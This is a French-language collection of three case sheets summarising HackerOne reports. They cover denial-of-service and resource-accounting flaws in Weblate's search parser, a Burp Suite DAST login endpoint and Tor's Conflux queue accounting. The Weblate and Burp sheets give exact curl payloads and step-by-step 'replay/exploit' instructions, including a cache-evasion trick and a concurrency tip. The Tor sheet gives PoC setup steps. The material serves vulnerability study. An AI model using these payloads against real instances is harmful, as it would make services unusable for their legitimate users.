# Fiches SSS — Resource Accounting / Abus de coûts

*3 cas sélectionnés dans le corpus 2025-2026 — extraits verbatim des fichiers bruts.*

---

### Unauthenticated ?q= search query causes exponential pyparsing backtracking in Weblate

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3898281)

La grammaire de recherche de Weblate (`weblate/utils/search.py:174-227`) est construite avec `pyparsing` sur une règle ambiguë à chaque position, sans memoization packrat : parser une requête à parenthèses imbriquées backtracke exponentiellement (~4× par niveau, O(4ⁿ)), soit 52 secondes de CPU pour 33 octets. Le parsing s'exécute sous le `PARSER_LOCK` global (`search.py:1237`) : une requête bloque tous les autres searches, browse, translate et zen du worker. Les vues `browse`, `translate` et `zen` parsent `?q=` sans authentification ni rate limiting.

**Cause racine :** ambiguïté de la grammaire pyparsing + absence de packrat, parsing effectué sous verrou global dans un chemin pré-auth : le `check_rate_limit("search", …)` n'existe que dans la vue `search` séparée.

**Preuve technique (verbatim depuis la source) :**

```
curl -sG 'https://weblate.example/browse/<project>/<component>/<lang>/' \
     --data-urlencode 'q=(a (a (a (a (a (a (a (a a))))))))'

  nested_parens        >   10s at n=8   len=17     30.498s  (parsed)          payload='((((((((a))))))))'
  nested_paren_terms   >   10s at n=7   len=29     12.855s  (parsed)          payload='(a (a (a (a (a (a (a a)))))))'

  baseline victim parse (uncontended): 0.751 ms
  attacker payload: '(a (a (a (a (a (a (a (a a))))))))' (33 bytes)
  attacker parse: 53.057 s
  victim0 parse:   52788.28 ms (70,295x baseline)
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun compte ; instance Weblate en configuration par défaut avec un projet lisible anonymement (« Pre-auth, default configuration »).
- Étapes : 1. Scripter des GET non authentifiés vers `/browse/<projet-public>/…/?q=(a (a (a (a (a (a (a (a b))))))))` en variant la dernière lettre pour défaire le `lru_cache`. 2. Chaque requête immobilise un worker ~52 s et bloque tout le parsing de ce process. 3. Quelques connexions concurrentes suffisent à rendre l'UI de traduction inutilisable.
- Pièges / limites : les requêtes sont bien formées et, pour la famille équilibrée, sont des requêtes valides qui finissent par répondre — rien n'est loggé comme anormal ; varier la dernière lettre est nécessaire.

**Reproductibilité :** haute — pré-auth, configuration par défaut, payloads exacts fournis.

**Techniques :** algorithmic complexity, exponential backtracking o(4n), pyparsing ambiguous grammar, missing packrat memoization, process-global lock amplification, unauthenticated resource exhaustion, lru_cache evasion

**Correspond aux classes qualifiantes :** dos, resource exhaustion, algorithmic complexity

**Signal (endpoints/fonctions observés) :**
- `/browse/<project>/<component>/<lang>/?q=…`
- vues `browse`, `translate`, `zen` (`weblate/trans/views/edit.py`)
- `parse_string()` et `PARSER_LOCK` (`weblate/utils/search.py`)

**Paramètres impliqués :** `q`

---

### Out of scope: Improper Input Validation Order on /api-internal/login via password field

**📄 Cas réel**
sévérité : low · [source](https://hackerone.com/reports/3625600)

Sur Burp Suite DAST (Enterprise), l'endpoint d'authentification interne `POST /api-internal/login` traite l'entrée avant d'appliquer la validation : des charges de plusieurs mégaoctets dans le champ `password` sont bufferisées, allouées et désérialisées en JSON avant rejet. Le domaine de l'instance de test est volontairement omis pour confidentialité ; l'endpoint est non authentifié et publiquement joignable.

**Cause racine :** ordre de validation incorrect dans le pipeline : le corps complet est reçu et parsé avant tout contrôle de taille de champ — aucune limite de longueur sur `password` côté application, pas de fail-fast.

**Preuve technique (verbatim depuis la source) :**

```
curl -X POST https://<target-instance>/api-internal/login \
  -H "Content-Type: application/json" \
  --data-binary @<(python3 -c '
payload = "A" * (10 * 1024 * 1024)
print(f\'{{"username":"admin","password":"{payload}"}}\')
')

{"code":2,"error":"Login failed."}
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : accès réseau à une instance Burp Suite DAST (domaine non divulgué) ; aucun compte.
- Étapes : 1. Envoyer le POST JSON de la source vers `/api-internal/login` avec un champ `password` de 10 Mo (le script construit le corps à la volée). 2. Observer que le serveur traite intégralement le corps (buffering, parsing JSON, allocation de chaîne) avant de renvoyer `{"code":2,"error":"Login failed."}`.
- Pièges / limites : les requêtes dépassant les limites de l'infrastructure amont sont rejetées au niveau réseau, mais celles en dessous du seuil sont traitées en entier par l'application ; le domaine est caviardé.

**Reproductibilité :** moyenne — aucune authentification requise, mais instance/domaine spécifiques non fournis (confidentialité) ; étapes complètes.

**Techniques :** improper validation order, fail-fast missing, oversized json body, unbounded password field, memory amplification

**Correspond aux classes qualifiantes :** dos, resource consumption, input validation

**Signal (endpoints/fonctions observés) :**
- `POST /api-internal/login` (interface de login interne Burp Suite DAST)
- réponse standard d'échec `{"code":2,"error":"Login failed."}`

**Paramètres impliqués :** `username`, `password`

---

### Malicious Conflux Endpoint Can Leave Stale Global OOO Queue Accounting After Teardown

**📄 Cas réel**
sévérité : low · [source](https://hackerone.com/reports/3701692)

Le compteur global d'allocation OOO de Conflux dans Tor reste gonflé après démontage d'un set. Un relais de sortie Conflux-capable attaquant envoie un gap `CONFLUX_SWITCH` réel suivi de cellules `RELAY_DATA` : le client met en file des messages hors ordre, puis le teardown libère ces messages sans décrémenter `total_ooo_q_bytes`. Le client victime est non modifié. Le PoC n'a pas déclenché d'OOM en configuration par défaut, mais le compteur reste non nul jusqu'au redémarrage de Tor.

**Cause racine :** `conflux_free_()` libère les messages OOO en file sans l'ajustement comptable correspondant, contrairement à la voie de dequeue normale : les octets déjà libérés restent comptés et pèsent sur `MaxMemInQueues` via `cell_queues_check_size()`.

**Preuve technique (verbatim depuis la source) :**

```c
total_ooo_q_bytes += cost;
cfx->ooo_q_alloc_cost += cost;
```

```c
SMARTLIST_FOREACH(cfx->ooo_q, conflux_msg_t *, cell,
                  conflux_relay_msg_free(cell));
smartlist_free(cfx->ooo_q);
```

```text
timestamp                  label                         mem_available_mb  client_rss_mb  client_vmsize_mb  conflux_counter  max_mem_in_queues  attacker_sends  oom_lines
2026-04-28T23:00:14+05:30  round-1-after-attack          7886.2            12.8           313.9             327716           6625393048         83              0
2026-04-28T23:00:24+05:30  round-1-after-clean-restart   8052.1            12.8           313.9             327716           6625393048         83              0
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : réseau Chutney privé, deux builds de Tor au commit `a66e072d7f3752fe98d4e59129b35b0942d4399b` (victime propre + binaire attaquant patché par `attacker-relay.diff`), gdb autorisé (`kernel.yama.ptrace_scope=0`), fichiers PoC (`run-poc.sh`, `attacker-relay.diff`, `chutney-network`).
- Étapes : 1. Compiler le binaire victime propre et le binaire attaquant patché. 2. Lancer `run-poc.sh` avec `ROUNDS=4`, `TARGET_COUNTER=1000000`, `TOR_CONFLUX_OOO_CELLS=900`. 3. Redémarrer les exit propres pour forcer le teardown et lire `conflux_get_total_bytes_allocation()` sur le client propre via gdb.
- Pièges / limites : « this report does not include a default-config OOM PoC » ; aucun OOM déclenché dans le run fourni ; setup lourd (deux builds + Chutney).

**Reproductibilité :** basse — environnement lourd et spécifique (builds Tor + Chutney + relais attaquant patché) et impact non déclenché en config par défaut.

**Techniques :** stale accounting counter, missing deallocation accounting on teardown, conflux ooo queue, oom recovery path amplification

**Correspond aux classes qualifiantes :** dos, resource exhaustion, memory accounting

**Signal (endpoints/fonctions observés) :**
- `conflux_free_()` (`src/core/or/conflux_pool.c`)
- `total_ooo_q_bytes` / `cfx->ooo_q_alloc_cost` (`src/core/or/conflux.c`)
- `cell_queues_check_size()` (`src/core/or/relay.c`)

**Paramètres impliqués :** non documenté dans la source
